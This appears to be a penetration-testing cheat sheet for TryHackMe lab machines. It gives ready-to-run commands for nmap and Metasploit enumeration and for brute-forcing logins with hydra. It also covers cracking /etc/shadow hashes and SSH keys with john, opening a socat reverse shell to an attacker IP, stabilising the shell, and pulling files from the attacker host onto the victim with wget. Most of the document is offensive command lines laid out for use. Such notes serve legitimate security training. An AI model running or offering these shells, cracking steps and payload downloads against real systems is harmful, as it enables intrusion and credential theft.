# Vulnerabilities database
## CLI
- `searchsploit`
## Website
- https://www.exploit-db.com
- https://nvd.nist.gov/vuln/search
- https://cve.mitre.org
# Wordlist
## In THM VM
- URL: `/usr/share/wordlists/dirb/common.txt`
- username/password: `/usr/share/wordlists/rockyou.txt`
# Enumuration
## Nmap
``` bash
nmap -A -oN nmap.vuln.log --script vuln ${IP}
nmap -A -oN nmap.log ${IP}
```
## Metasploit
``` console
msfconsole
> search ${MODULE}
> use ${MODULE}
> show options
> set ${OPTION}
> exploit
```
## Samba
- `enum4linux -a ${IP} > enum4linux.log`

# Privilege Escalation
## Windows 
- PowerSploit: https://github.com/PowerShellMafia/PowerSploit
## Linux
- LinEnum: https://github.com/rebootuser/LinEnum
- GTFOBins: https://gtfobins.github.io
- PEASS-ng: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

# Brute Force
- ``` bash
  hydra \
  -L /usr/share/wordlists/rockyou.txt \
  -P /usr/share/wordlists/rockyou.txt \
  ${IP} ${PROTOCOL}
  ```
- `/etc/shadow`: \
  `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
- `id_rsa`: 
  ``` bash
  ssh2john.py id_rsa > john_id_rsa
  john --wordlist=/usr/share/wordlists/rockyou.txt john_id_rsa
  ```
# Reverse Shell
## Listener (Attacker)
`ncat -lnvp 1234`
## Payload (Victim)
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
## Stabilize Reversed Shell Techniques
### 1. Python
In victim machine execute:
``` bash
# in victim
python -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm-256color

# in attacker
Ctrl-Z
stty raw -echo; fg
```
Example:
![0](./pictures/0.png)
### 2. rlwrap
``` bash
# in attacker
sudo apt install rlwrap
rlwrap nc -lvnp ${PORT}
Ctrl-Z
stty raw -echo; fg
```
### 3. socat

``` bash
# in attacker
socat TCP-L:1234 FILE:`tty`,raw,echo=0

# in victim
socat TCP:${ATTACKER_IP}:1234 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
## Upload Files
In attacker machine execute:
``` bash
# in attacker
python3 -m http.server 9001

# in victim
wget IP:9001/${FILENAME} -O /dev/shm/${FILENAME}
```